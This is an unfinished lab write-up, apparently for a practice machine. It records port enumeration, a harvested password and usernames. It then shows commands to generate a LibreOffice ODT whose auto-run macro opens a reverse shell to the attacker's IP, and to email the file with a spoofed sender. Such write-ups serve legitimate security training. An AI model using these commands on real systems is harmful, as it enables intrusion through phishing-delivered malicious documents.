#InProgress 
```IP
192.168.187.140
```
# Enumeration
## SMTP 25
## Finger 79
```
perl finger-user-enum.pl -U ../../users.txt -t 192.168.187.140
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241207171044.png?raw=true)
## IMAP 143 imapd 4.62
We discover here 2 things. the first one is that the password discovered in http 8000 works here
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241207173958.png?raw=true)
secondly, the server appears to be processing automatically spreadsheets and documents
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241207173911.png?raw=true)
We also know that we need to send it to mailadmin 
```
mailadmin@localhost
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241207174320.png?raw=true)

## HTTP 443

possible usernames in dir /team
```
agnes
charlotte
ela_arwel
jonas
magnus
martha
```
## HTTP 8000
we find a password
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241207172748.png?raw=true)
```
SicMundusCreatusEst
```
## HTTP 2224
mlss
Mercury/32

## FTP 20001 FileZilla ftpd 0.9.41 beta
couldnt find anything interesting

# Exploitation
For the malicious libreoffice odt file we will need to create a macro that executes automatically a revshell
We will use the following script
https://github.com/0bfxgh0st/MMG-LO/blob/main/mmg-odt.py
from
https://github.com/0bfxgh0st/MMG-LO/tree/main
```
python mmg-odt.py windows 192.168.45.228 4444
```

```
sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.odt --server 192.168.187.140 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz

# Lateral Movement
